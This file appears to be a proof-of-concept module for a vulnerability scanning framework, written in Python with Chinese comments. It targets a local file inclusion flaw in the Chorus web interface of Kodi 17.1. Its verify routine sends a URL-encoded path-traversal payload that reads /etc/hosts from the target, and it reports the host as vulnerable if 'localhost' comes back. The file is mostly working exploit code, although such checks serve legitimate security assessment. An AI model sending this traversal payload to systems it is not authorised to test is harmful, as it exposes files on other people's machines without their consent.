# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Kodi_0001'  # 平台漏洞编号
    name = 'Kodi本地文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2017-03-06'  # 漏洞公布时间
    desc = '''
    Kodi（原XBMC）是由XBMC基金会开发的一个免费和开源的媒体播放器软件应用程序。Chorus是用于控制和与Kodi交互的web界面。
    Kodi存在本地文件包含漏洞，该漏洞源于程序对URL执行的用户输入验证不足。攻击者可通过更改URL的'/image/image%3A%2F%2F’部分后的位置，利用此漏洞从文件系统中检索任意文件。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-02428'
    cnvd_id = 'CNVD-2017-02428'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Kodi'  # 漏洞组件名称
    product_version = 'XBMC Kodi 17.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd6743c27-d18b-4bef-a8e8-36537f1fd7dc'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-08-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/image/image%3A%2F%2F%2e%2e%252fetc%252fhosts'

            vul_url = arg + payload
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            response = requests.get(vul_url)
            self.output.info("正在尝试读取系统敏感文件信息")
            if response.status_code == 200 and 'localhost' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
